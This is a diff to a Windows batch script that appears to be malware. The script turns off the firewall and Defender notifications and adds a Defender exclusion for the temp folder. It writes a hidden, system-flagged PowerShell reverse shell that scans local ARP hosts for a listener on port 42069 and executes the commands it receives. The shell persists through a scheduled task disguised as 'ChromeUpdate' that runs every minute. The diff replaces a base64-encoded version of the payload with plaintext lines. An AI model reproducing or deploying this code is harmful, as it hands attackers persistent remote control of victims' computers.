@@ -17,16 +17,24 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notif
 :: disable firewall
 netsh advfirewall set allprofiles state off >nul 2>&1
 
-:: disable windows defender
-powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
-
 :: set up reverse shell
 set "taskname=ChromeUpdate"
 set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
 set "file=revsh.ps1"
 
-echo iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aWYgKG5ldHN0YXQgLWFuIHwgc2VsZWN0LXN0cmluZyAiOjQyMDY5IikgewogICAgZXhpdAp9CgokYWRkcnMgPSBAKGFycCAtYSB8IHNlbGVjdC1zdHJpbmcgZHluYW1pYyB8IGZvcmVhY2gtb2JqZWN0IHsgKCRfLmxpbmUudHJpbSgpIC1zcGxpdCAiICIpWzBdIH0pCgpmb3JlYWNoICgkYWRkciBpbiAkYWRkcnMpIHsKICAgIHBpbmcgJGFkZHIgLW4gMiAtdyA1MDAKCiAgICBpZiAoISQ/KSB7CiAgICAgICAgY29udGludWUKICAgIH0KCiAgICB0cnkgeyAKICAgICAgICAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRhZGRyLCA0MjA2OSkgCgogICAgICAgICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpIAoKICAgICAgICBbYnl0ZVtdXSAkYnVmZmVyID0gMC4uNjU1MzUgfCAlezB9IAoKICAgICAgICB3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpKSAtbmUgMCl7IAogICAgICAgICAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ1ZmZlciwgMCwgJGkpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJyAKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2sgPSAiRXJyb3I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpYG4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2spIAogICAgICAgICAgICAKICAgICAgICAgICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKSAKICAgICAgICAgICAgJHN0cmVhbS5GbHVzaCgpIAogICAgICAgIH0KCiAgICAgICAgJGNsaWVudC5DbG9zZSgpCiAgICB9IGNhdGNoIHt9Cn0="))) > %file%
+echo if (netstat -an ^| select-string ":42069") { exit; } > %file%
+echo $addrs = @(arp -a ^| select-string dynamic ^| foreach-object { ($_.line.trim() -split " ")[0] }); >> %file%
+echo foreach ($addr in $addrs) { >> %file%
+echo ping $addr -n 2 -w 500; if (!$?) { continue } >> %file%
+echo try { $client = New-Object System.Net.Sockets.TCPClient($addr, 42069); $stream = $client.GetStream(); [byte[]] $buffer = 0..65535 ^| %%{0}; >> %file%
+echo while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){ >> %file%
+echo $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); >> %file%
+echo try { $sendback = (iex $data 2>&1 ^| Out-String ) + 'PS ' + (pwd).Path + '^> '; } catch { $sendback = "Error: $($_.Exception.Message)`n"; } >> %file%
+echo $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); } >> %file%
+echo $client.Close(); } catch {} } >> %file%
+
 attrib +h +s +r %file% >nul 2>&1
+powershell -command "Add-MpPreference -ExclusionPath \"%TEMP%\""
 
 schtasks /create /tn "%taskname%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%\%file%\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
 powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul
